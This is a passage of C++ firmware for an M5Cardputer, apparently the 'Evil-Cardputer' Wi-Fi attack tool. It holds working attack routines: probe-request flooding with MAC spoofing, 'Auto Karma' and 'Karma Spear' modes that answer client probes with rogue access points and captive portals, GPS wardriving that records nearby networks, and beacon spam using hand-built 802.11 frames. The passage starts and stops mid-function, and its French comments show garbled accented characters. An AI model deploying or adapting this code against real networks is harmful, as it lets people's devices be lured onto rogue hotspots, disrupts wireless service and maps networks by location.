  Serial.println(F("-------------------"));

  while (isProbeAttackRunning) {
        unsigned long currentMillis = millis();

       if (probeCount % macChangeRate == 0) {
          setRandomMAC_STA();
        }
      
        if (probeCount % channelHopRate == 0) {
          setNextWiFiChannel();
        }
      
        String ssid;
        if (!customProbes.empty()) {
          ssid = customProbes[ssidIndex++ % customProbes.size()];
        } else {
          ssid = generateRandomSSID(10 + random(21));
        }
      
        sendProbeRequest(ssid.c_str());
        probeCount++;

      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));
        pixels.show();
        delay(30);
        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.show();
      }

      M5.Display.setCursor(probesTextX + 12, 67);
      M5.Display.fillRect(probesTextX + 12, 67, 40, 15, menuBackgroundColor);
      M5.Display.print(probeCount);

      Serial.println("Sent probe request: " + ssid);
    

    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
      isProbeAttackRunning = false;
    }
  }
  Serial.println(F("-------------------"));
  Serial.println(F("Stopping Probe Attack"));
  Serial.println(F("-------------------"));
  //restoreOriginalWiFiSettings();
  useCustomProbes = false;
  inMenu = true;
  drawMenu();
}

int currentChannel = 1;
int originalChannel = 1;

void setNextWiFiChannel() {
  static const uint8_t channels[] = {1, 3, 6, 9, 11};
  static size_t channelIndex = 0;

  channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
  currentChannel = channels[channelIndex];
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}


void restoreOriginalWiFiSettings() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminÃ©
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  restoreOriginalMAC();
  WiFi.mode(WIFI_STA);
}


// probe attack end


/*
============================================================================================================================
Auto Karma
============================================================================================================================
*/
bool isAPDeploying = false;

void startAutoKarma() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminÃ©
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println(F("-------------------"));
  Serial.println(F("Karma Auto Attack Started...."));
  Serial.println(F("-------------------"));

  readConfigFile("/evil/config/config.txt");
  createCaptivePortal();
  WiFi.softAPdisconnect(true);
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
}


void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
    uint8_t ssid_length_Karma_Auto = frame[25];
    if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
      char tempSSID[33];
      memset(tempSSID, 0, sizeof(tempSSID));
      for (int i = 0; i < ssid_length_Karma_Auto; i++) {
        tempSSID[i] = (char)frame[26 + i];
      }
      tempSSID[ssid_length_Karma_Auto] = '\0';
      memset(lastSSID, 0, sizeof(lastSSID));
      strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
      newSSIDAvailable = true;
    }
  }
}



bool readConfigFile(const char* filename) {
  whitelist.clear();
  File configFile = SD.open(filename);
  if (!configFile) {
    Serial.println(F("Failed to open config file"));
    return false;
  }

  while (configFile.available()) {
    String line = configFile.readStringUntil('\n');
    if (line.startsWith("KarmaAutoWhitelist=")) {
      int startIndex = line.indexOf('=') + 1;
      String ssidList = line.substring(startIndex);
      if (!ssidList.length()) {
        break;
      }
      int lastIndex = 0, nextIndex;
      while ((nextIndex = ssidList.indexOf(',', lastIndex)) != -1) {
        whitelist.push_back(ssidList.substring(lastIndex, nextIndex).c_str());
        lastIndex = nextIndex + 1;
      }
      whitelist.push_back(ssidList.substring(lastIndex).c_str());
    }
  }
  configFile.close();
  return true;
}


bool isSSIDWhitelisted(const char* ssid) {
  std::string ssidStr(ssid);

  for (const auto& wssid : whitelist) {
    // Convertit le pattern avec * en regex
    std::string pattern = std::regex_replace(wssid, std::regex(R"([\.\^\$\+\?\(\)\[\]\{\}\\\|])"), R"(\$&)"); // Ã©chappe les caractÃ¨res spÃ©ciaux
    pattern = std::regex_replace(pattern, std::regex(R"(\*)"), ".*"); // remplace * par .*
    std::regex regexPattern("^" + pattern + "$", std::regex_constants::icase); // match exact insensible Ã  la casse

    if (std::regex_match(ssidStr, regexPattern)) {
      return true;
    }
  }

  return false;
}


uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
  esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
  esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}

String generateRandomMACKarma() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  // Force unicast byte
  mac[0] &= 0xFE;

  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_APKarma() {

  esp_wifi_stop();

  wifi_mode_t currentMode;
  esp_wifi_get_mode(&currentMode);
  if (currentMode != WIFI_MODE_AP && currentMode != WIFI_MODE_APSTA) {
    esp_wifi_set_mode(WIFI_MODE_AP);
  }

  String macKarma = generateRandomMACKarma();
  uint8_t macArrayKarma[6];
  sscanf(macKarma.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArrayKarma[0], &macArrayKarma[1], &macArrayKarma[2], &macArrayKarma[3], &macArrayKarma[4], &macArrayKarma[5]);

  esp_err_t ret = esp_wifi_set_mac(WIFI_IF_AP, macArrayKarma);
  if (ret != ESP_OK) {
    Serial.print(F("Error setting MAC: "));
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }

  ret = esp_wifi_start();
  if (ret != ESP_OK) {
    Serial.print(F("Error starting WiFi: "));
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }
}



String getMACAddress() {
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}


void loopAutoKarma() {
  while (isAutoKarmaActive) {
    M5.update(); M5Cardputer.update();
    if (millis() - lastKarmaChannelSwitch > karmaChannelInterval) {
      lastKarmaChannelSwitch = millis();
      hopKarmaChannel();
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      isAutoKarmaActive = false;
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      inMenu = true;
      memset(lastSSID, 0, sizeof(lastSSID));
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      newSSIDAvailable = false;
      esp_wifi_set_promiscuous(false);
      Serial.println(F("-------------------"));
      Serial.println(F("Karma Auto Attack Stopped...."));
      Serial.println(F("-------------------"));
      break;
    }
    if (newSSIDAvailable) {
      newSSIDAvailable = false;
      activateAPForAutoKarma(lastSSID); // Activate the AP
      isWaitingForProbeDisplayed = false;
    } else {
      if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
        displayWaitingForProbe();
        Serial.println(F("-------------------"));
        Serial.println(F("Waiting for probe...."));
        Serial.println(F("-------------------"));
        isWaitingForProbeDisplayed = true;
      }
    }

    delay(100);
  }

  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
  inMenu = true;
  drawMenu();
}

void activateAPForAutoKarma(const char* ssid) {
  if (isSSIDWhitelisted(ssid)) {
    Serial.println(F("-------------------"));
    Serial.println("SSID in the whitelist, skipping : " + String(ssid));
    Serial.println(F("-------------------"));
    return;
  }
  if (strcmp(ssid, lastDeployedSSID) == 0) {
    Serial.println(F("-------------------"));
    Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
    Serial.println(F("-------------------"));
    return;
  }

  isAPDeploying = true;
  isInitialDisplayDone = false;

  // ParamÃ¨tres AP
  const int  channel     = 1;    // canal Wi-Fi (1â€“13)
  const bool hidden      = false;// SSID visible
  const int  maxClients  = 15;   // jusquâ€™Ã  15 clients (ESP-IDF 4.4)

  if (captivePortalPassword.isEmpty()) {
    WiFi.softAP(ssid,           // SSID
                nullptr,        // pas de mot de passe
                channel,
                hidden,
                maxClients);
  } else {
    WiFi.softAP(ssid,                       // SSID
                captivePortalPassword.c_str(), // mot de passe
                channel,
                hidden,
                maxClients);
  }
  DNSServer dnsServer;
  WebServer server(80);

  Serial.println(F("-------------------"));
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s " );
  Serial.println(F("-------------------"));
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
    displayAPStatus(ssid, startTime, autoKarmaAPDuration);
    dnsServer.processNextRequest();
    server.handleClient();

    M5.update(); M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      break;
    }

    int clientCount = WiFi.softAPgetStationNum();
    if (clientCount > 0) {
      clonedSSID = String(ssid);
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      Serial.println(F("-------------------"));
      Serial.println("Karma Successful for : " + String(clonedSSID));
      Serial.println(F("-------------------"));
      memset(lastSSID, 0, sizeof(lastSSID));
      newSSIDAvailable = false;
      M5.Display.clear();
      M5.Display.setCursor(5 , 32);
      M5.Display.println("Karma Successfull !!!");
      M5.Display.setCursor(5 , 48);
      M5.Display.println("On : " + clonedSSID);
      delay(7000);
      WiFi.softAPdisconnect(true);
      karmaSuccess = true;
      return;
    }

    delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

  WiFi.softAPdisconnect(true);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println(F("-------------------"));
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println(F("-------------------"));
}


void displayWaitingForProbe() {
  M5.Display.setCursor(5, 5);
  if (!isWaitingForProbeDisplayed) {
    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(menuTextUnFocusedColor);
    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(M5.Display.width() / 2 - 54, M5.Display.height() - 20);
    M5.Display.println("Stop Auto");
    M5.Display.setCursor(5, M5.Display.height() / 2 - 20);
    M5.Display.print("Waiting for probe");

    isWaitingForProbeDisplayed = true;
  }

  unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
    lastProbeDisplayUpdate = currentTime;
    probeDisplayState = (probeDisplayState + 1) % 4;

    // Calculer la position X pour l'animation des points
    int textWidth = M5.Display.textWidth("Waiting for probe ");
    int x = textWidth;
    int y = M5.Display.height() / 2 - 20;

    // Effacer la zone derriÃ¨re les points
    M5.Display.fillRect(x, y, M5.Display.textWidth("..."), M5.Display.fontHeight(), menuBackgroundColor);

    M5.Display.setCursor(x, y);
    for (int i = 0; i < probeDisplayState; i++) {
      M5.Display.print(".");
    }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(5, 5);
  if (!isInitialDisplayDone) {
    M5.Display.clear();
    M5.Display.setTextColor(menuTextUnFocusedColor);

    M5.Display.setCursor(5, 10);
    M5.Display.println(String(ssid));

    M5.Display.setCursor(5, 30);
    M5.Display.print("Left Time: ");
    M5.Display.setCursor(5, 50);
    M5.Display.print("Connected Client: ");
    // Affichage du bouton Stop
    M5.Display.setCursor(50, M5.Display.height() - 10);
    M5.Display.println("Stop");

    isInitialDisplayDone = true;
  }
  int timeValuePosX = M5.Display.textWidth("Left Time: ");
  int timeValuePosY = 30;
  M5.Display.fillRect(timeValuePosX, 20 , 25, 20, menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor);
  M5.Display.setCursor(timeValuePosX, timeValuePosY);
  M5.Display.print(remainingTime);
  M5.Display.print(" s ");

  int clientValuePosX = M5.Display.textWidth("Connected Client: ");
  int clientValuePosY = 50;
  M5.Display.fillRect(clientValuePosX, 40 , 25 , 20, menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor);
  M5.Display.setCursor(clientValuePosX, clientValuePosY);
  M5.Display.print(clientCount);
}

//Auto karma end



/*
============================================================================================================================
Wardriving
============================================================================================================================
*/

String createPreHeader() {
  String preHeader = "WigleWifi-1.4";
  preHeader += ",appRelease=v1.4.9"; // Remplacez [version] par la version de votre application
  preHeader += ",model=Cardputer";
  preHeader += ",release=v1.4.9"; // Remplacez [release] par la version de l'OS de l'appareil
  preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de pÃ©riphÃ©rique, si souhaitÃ©
  preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractÃ©ristiques d'affichage, si pertinent
  preHeader += ",board=M5Cardputer";
  preHeader += ",brand=M5Stack";
  return preHeader;
}

String createHeader() {
  return "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type";
}

int nearPrevousWifi = 0;
double lat = 0.0, lng = 0.0, alt = 0.0; // DÃ©claration des variables pour la latitude, la longitude et l'altitude
float accuracy = 0.0; // DÃ©claration de la variable pour la prÃ©cision


void wardrivingMode() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  Serial.println(F("-------------------"));
  Serial.println(F("Starting Wardriving"));
  Serial.println(F("-------------------"));
  M5.Lcd.fillScreen(menuBackgroundColor);
  M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Lcd.setTextSize(1.5);
  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
  M5.Display.setCursor(M5.Display.width() / 2 - 24 , M5.Display.height() - 20);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Lcd.setCursor(0, 10);
  M5.Lcd.printf("Scanning...");
  M5.Lcd.setCursor(0, 30);
  M5.Lcd.println("No GPS Data");

  delay(1000);
  if (!SD.exists("/evil/wardriving")) {
    SD.mkdir("/evil/wardriving");
  }

  File root = SD.open("/evil/wardriving");
  int maxIndex = 0;
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    String name = entry.name();
    int startIndex = name.indexOf('-') + 1;
    int endIndex = name.indexOf('.');
    if (startIndex > 0 && endIndex > startIndex) {
      int fileIndex = name.substring(startIndex, endIndex).toInt();
      if (fileIndex > maxIndex) maxIndex = fileIndex;
    }
    entry.close();
  }
  root.close();

  bool exitWardriving = false;
  bool scanStarted = false;
  while (!exitWardriving) {
    M5.update(); M5Cardputer.update();
    handleDnsRequestSerial();

    if (!scanStarted) {
      WiFi.scanNetworks(true, true); // Start async scan
      scanStarted = true;
    }

    bool gpsDataAvailable = false;
    String gpsData;

    while (cardgps.available() > 0 && !gpsDataAvailable) {
      if (gps.encode(cardgps.read())) {
        if (gps.location.isValid() && gps.date.isValid() && gps.time.isValid()) {
          lat = gps.location.lat();
          lng = gps.location.lng();
          alt = gps.altitude.meters();
          accuracy = gps.hdop.value();
          gpsDataAvailable = true;
          // Affichage des informations GPS sur l'Ã©cran
          M5.Lcd.setCursor(0, 30);
          M5.Lcd.print("Longitude:");
          M5.Lcd.println(String(gps.location.lng(), 6));
          M5.Lcd.setCursor(0, 45);
          M5.Lcd.print("Latitude:");
          M5.Lcd.println(String(gps.location.lat(), 6));
          M5.Lcd.setCursor(0, 60);
          M5.Lcd.print("Sattelites:" + String(gps.satellites.value()));
          M5.Lcd.println("  ");

          // Altitude
          M5.Lcd.setCursor(0, 75);
          M5.Lcd.print("Altitude:");
          M5.Lcd.print(String(gps.altitude.meters(), 2) + "m");
          M5.Lcd.println("  ");

          // Date et Heure
          String dateTime = formatTimeFromGPS();
          M5.Lcd.setCursor(0, 90);
          M5.Lcd.print("Time:");
          M5.Lcd.print(dateTime);
          M5.Lcd.println("  ");
        }
      }
    }


    int n = WiFi.scanComplete();
    if (n > -1) {
      String currentTime = formatTimeFromGPS();
      String wifiData = "\n";
      for (int i = 0; i < n; ++i) {
        // Formater les donnÃ©es pour chaque SSID trouvÃ©
        String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
        line += currentTime + ",";
        line += String(WiFi.channel(i)) + ",";
        line += String(WiFi.RSSI(i)) + ",";
        line += String(lat, 6) + "," + String(lng, 6) + ",";
        line += String(alt) + "," + String(accuracy) + ",";
        line += "WIFI";
        wifiData += line + "\n";
      }
      
      Serial.println(F("----------------------------------------------------"));
      Serial.print("WiFi Networks: " + String(n));
      Serial.print(wifiData);
      Serial.println(F("----------------------------------------------------"));

      String fileName = "/evil/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";

      // Ouvrir le fichier en mode lecture pour vÃ©rifier s'il existe et sa taille
      File file = SD.open(fileName, FILE_READ);
      bool isNewFile = !file || file.size() == 0;
      if (file) {
        file.close();
      }

      // Ouvrir le fichier en mode Ã©criture ou append
      file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);

      if (file) {
        if (isNewFile) {
          // Ã‰crire les en-tÃªtes pour un nouveau fichier
          file.println(createPreHeader());
          file.println(createHeader());
        }
        file.print(wifiData);
        file.close();
      }

      scanStarted = false; // Reset for the next scan
      // Mettre Ã  jour le nombre de WiFi Ã  proximitÃ© sur l'Ã©cran
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.printf("Near WiFi: %d  \n", n);
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) ) {
      exitWardriving = true;
      delay(1000);
      M5.Display.setTextSize(1.5);
      if (confirmPopup("List Open Networks?")) {
        M5.Lcd.fillScreen(menuBackgroundColor);
        M5.Display.setCursor(5, M5.Display.height() / 2);
        M5.Display.println("Saving Open Networks");
        M5.Display.println("  Please wait...");
        createKarmaList(maxIndex);
      }
      waitAndReturnToMenu("Stopping Wardriving.");
      Serial.println(F("-------------------"));
      Serial.println(F("Stopping Wardriving"));
      Serial.println(F("-------------------"));
    }
  }

  Serial.println(F("-------------------"));
  Serial.println(F("Session Saved."));
  Serial.println(F("-------------------"));
}


String getCapabilities(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN: return "[OPEN][ESS]";
    case WIFI_AUTH_WEP: return "[WEP][ESS]";
    case WIFI_AUTH_WPA_PSK: return "[WPA-PSK][ESS]";
    case WIFI_AUTH_WPA2_PSK: return "[WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA_WPA2_PSK: return "[WPA-WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-ENTERPRISE][ESS]";
    default: return "[UNKNOWN]";
  }
}

String formatTimeFromGPS() {
  if (gps.time.isValid() && gps.date.isValid()) {
    char dateTime[30];
    sprintf(dateTime, "%04d-%02d-%02d %02d:%02d:%02d", gps.date.year(), gps.date.month(), gps.date.day(),
            gps.time.hour(), gps.time.minute(), gps.time.second());
    return String(dateTime);
  } else {
    return "0000-00-00 00:00:00";
  }
}


void createKarmaList(int maxIndex) {

  std::set<std::string> uniqueSSIDs;
  // Lire le contenu existant de KarmaList.txt et l'ajouter au set
  File karmaListRead = SD.open("/evil/KarmaList.txt", FILE_READ);
  if (karmaListRead) {
    while (karmaListRead.available()) {
      String ssid = karmaListRead.readStringUntil('\n');
      ssid.trim();
      if (ssid.length() > 0) {
        uniqueSSIDs.insert(ssid.c_str());
      }
    }
    karmaListRead.close();
  }

  File file = SD.open("/evil/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
  if (!file) {
    Serial.println(F("Error opening scan file"));
    return;
  } else {
    Serial.println(F("Scan file opened successfully"));
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (isNetworkOpen(line)) {
      String ssid = extractSSID(line);
      uniqueSSIDs.insert(ssid.c_str());
    }
  }
  file.close();

  // Ã‰crire le set dans KarmaList.txt
  File karmaListWrite = SD.open("/evil/KarmaList.txt", FILE_WRITE);
  if (!karmaListWrite) {
    Serial.println(F("Error opening KarmaList.txt for writing"));
    return;
  } else {
    Serial.println(F("KarmaList.txt opened for writing"));
  }

  Serial.println(F("Writing to KarmaList.txt"));
  for (const auto& ssid : uniqueSSIDs) {
    karmaListWrite.println(ssid.c_str());
    Serial.println("Writing SSID: " + String(ssid.c_str()));
  }
}

bool isNetworkOpen(const String & line) {
  int securityTypeStart = nthIndexOf(line, ',', 1) + 1;
  int securityTypeEnd = nthIndexOf(line, ',', 2);
  String securityType = line.substring(securityTypeStart, securityTypeEnd);
  return securityType.indexOf("[OPEN][ESS]") != -1;
}

String extractSSID(const String & line) {
  int ssidStart = nthIndexOf(line, ',', 0) + 1;
  int ssidEnd = nthIndexOf(line, ',', 1);
  String ssid = line.substring(ssidStart, ssidEnd);
  return ssid;
}

int nthIndexOf(const String & str, char toFind, int nth) {
  int found = 0;
  int index = -1;
  while (found <= nth && index < (int) str.length()) {
    index = str.indexOf(toFind, index + 1);
    if (index == -1) break;
    found++;
  }
  return index;
}

/*
============================================================================================================================
Karma Spear
============================================================================================================================
*/
void karmaSpear() {
  isAutoKarmaActive = true;
  createCaptivePortal();
  File karmaListFile = SD.open("/evil/KarmaList.txt", FILE_READ);
  if (!karmaListFile) {
    Serial.println(F("Error opening KarmaList.txt"));
    waitAndReturnToMenu(" No KarmaFile.");
    return;
  }
  if (karmaListFile.available() == 0) {
    karmaListFile.close();
    Serial.println(F("KarmaFile empty."));
    waitAndReturnToMenu(" KarmaFile empty.");
    return;
  }
  while (karmaListFile.available()) {
    String ssid = karmaListFile.readStringUntil('\n');
    ssid.trim();

    if (ssid.length() > 0) {
      activateAPForAutoKarma(ssid.c_str());
      Serial.println("Created Karma AP for SSID: " + ssid);
      displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
      if (karmaSuccess) {
        waitAndReturnToMenu("return to menu");
        return;
      }
      delay(200);
    }
  }
  karmaListFile.close();
  isAutoKarmaActive = false;
  Serial.println(F("Karma Spear Failed..."));
  waitAndReturnToMenu("Karma Spear Failed...");
}


/*
============================================================================================================================
Beacon spam
============================================================================================================================
*/
static uint16_t sequenceNumber = 0;

// taille totale du paquet (header 24 + 8 + 2 + 2 + IE 2+32 + 2+8 + 3 + 6)
const size_t BEACON_PACKET_SIZE = 89; // octets rÃ©ellement envoyÃ©s

uint8_t beaconPacket[96] = {
    /*  0 */ 0x80, 0x00,               // Frame Control : Beacon
    /*  2 */ 0x00, 0x00,               // Duration

    /*  4 â€“ 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination : broadcast
    /* 10 â€“ 15 */ 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (ajoutÃ©e dynamiquement)
    /* 16 â€“ 21 */ 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (idem)
    /* 22 â€“ 23 */ 0x00, 0x00,               // Sequence Control

    /* 24 â€“ 31 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp

    /* 32 â€“ 33 */ 0x64, 0x00,             // Beacon interval : 100 TU
    /* 34 â€“ 35 */ 0x21, 0x04,             // Capabilities : ESS | Short Preamble | Short Slot

    // ---- IE SSID (Type 0, Len 32) ----
    /* 36 */ 0x00, 0x20,
    /* 38 â€“ 69 */
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,

    // ---- IE Supported Rates (Type 1, Len 8) ----
    /* 70 */ 0x01, 0x08,
    /* 72 â€“ 79 */ 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,

    // ---- IE DS Param Set (Type 3, Len 1) ----
    /* 80 â€“ 82 */ 0x03, 0x01, 0x01, // canal modifiÃ© dynamiquement

    // ---- IE TIM minimal (Type 5, Len 4) ----
    /* 83 â€“ 88 */ 0x05, 0x04, 0x00, 0x01, 0x00, 0x00
};

// SÃ©lection des canaux (1â€“13)
const uint8_t channels[] = {1,2,3,6,9,11,13};
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

// -------------------- Utilitaires -----------------

std::vector<String> readCustomBeacons(const char* filename){
    std::vector<String> customBeacons;
    File file = SD.open(filename, FILE_READ);
    if(!file){
        Serial.println(F("Failed to open file for reading"));
        return customBeacons;
    }
    while(file.available()){
        String line = file.readStringUntil('\n');
        line.trim();
        if(line.startsWith("CustomBeacons=")){
            String beaconsStr = line.substring(String("CustomBeacons=").length());
            while(beaconsStr.length()>0){
                int idx = beaconsStr.indexOf(',');
                if(idx==-1){ customBeacons.push_back(beaconsStr); break; }
                customBeacons.push_back(beaconsStr.substring(0,idx));
                beaconsStr = beaconsStr.substring(idx+1);
            }
            break;
        }
    }
    file.close();
    return customBeacons;
}

void nextChannel(){
    if(sizeof(channels)/sizeof(channels[0])>1){
        wifi_channel = channels[channelIndex];
        channelIndex = (channelIndex+1)% (sizeof(channels)/sizeof(channels[0]));
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
}

void generateRandomWiFiMac(uint8_t *mac){
    mac[0] = 0x02; // Locally administered, unicast
    for(int i=1;i<6;i++) mac[i] = random(0,255);
}

char randomName[32];
char* randomSSID(){
    const char *charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!@#$%^&*()[]{}<>+=.,?;:'\"|/~`\\";
    int len = random(8,33);
    for(int i=0;i<len;++i) randomName[i]=charset[random() % strlen(charset)];
    randomName[len]='\0';
    return randomName;
}

// -------------------- Construction du paquet -----------------

void setSSID(const char* ssid, uint8_t len){
    // IE SSID commence Ã  l'offset 38, longueur fixÃ©e Ã  32 octets
    memset(&beaconPacket[38], 0x20, 32);   // pad avec des espaces (0x20)
    memcpy(&beaconPacket[38], ssid, len);
    // longueur dÃ©clarÃ©e reste 32 -> beaconPacket[37] dÃ©jÃ  Ã  0x20
}

void prepareBeacon(const char* ssid, uint8_t len, const uint8_t* mac){
    // MAC source + BSSID
    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);

    // Timestamp
    uint64_t ts = esp_timer_get_time();
    memcpy(&beaconPacket[24], &ts, sizeof(ts));

    // NumÃ©ro de sÃ©quence (4 bits fragment = 0)
    sequenceNumber = (sequenceNumber + 0x10) & 0xFFF0;
    beaconPacket[22] = sequenceNumber & 0xFF;
    beaconPacket[23] = (sequenceNumber >> 8) & 0xFF;

    // Canal (byte 82)
    beaconPacket[82] = wifi_channel;

    // SSID
    setSSID(ssid, len);
}

void beaconSpamList(const char* list, size_t listSize){
    if(listSize==0){ Serial.println(F("Empty list provided.")); return; }
    int idx=0; uint16_t burst=0;
    nextChannel(); // canal initial

    while(idx < listSize){
        // extraction d'une ligne (\n => sÃ©parateur), max 32 car.
        uint8_t len=0; while(idx+len<listSize && list[idx+len]!='\n' && len<32) len++;
        if(len==0){ idx++; continue; }

        char ssid[33]="\0"; memcpy(ssid, &list[idx], len); ssid[len]='\0';
        uint8_t mac[6]; generateRandomWiFiMac(mac);

        prepareBeacon(ssid, len, mac);

        // envoyer 3 fois
        for(int k=0;k<3;k++){
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PACKET_SIZE, false);
            delay(1);
            burst++;
        }

        // ralentir + channel hop
        if(burst % 9 == 0){
            delay(80); // laisse le temps aux scans Windows
            nextChannel();
        }

        // touche arrÃªt
        if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
        idx += len;
        // sauter le "\n" Ã©ventuel
        if(idx < listSize && list[idx]=='\n') idx++;
    }
}

// -------------------- Attaque principale -----------------

void beaconAttack(){
    WiFi.mode(WIFI_MODE_STA);

    bool useCustomBeacons = confirmPopup("Use custom beacons?");
    M5.Display.clear();

    std::vector<String> customBeacons;
    if(useCustomBeacons) customBeacons = readCustomBeacons("/evil/config/config.txt");

    unsigned long previousMillis=0; // tempo personnalisÃ©e si besoin

